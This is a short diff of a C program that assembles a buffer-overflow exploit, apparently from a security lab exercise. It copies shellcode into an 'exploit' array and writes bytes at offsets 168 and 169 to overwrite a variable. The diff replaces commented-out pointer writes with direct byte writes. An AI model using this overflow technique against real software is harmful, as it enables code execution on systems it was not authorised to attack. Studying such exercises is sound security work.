@@ -27,11 +27,6 @@ int main(void)
     exploit[i+15]=shellcode[i];
   }
   
-  // p = (int *) &exploit[168];
-  // *p = 0x000000bb;
-
-  // p = (int *) &exploit[172];
-  // *p = 0x000000ac;
   //overwrite i
   exploit[168]='\xa4';
   exploit[169]='\x00';
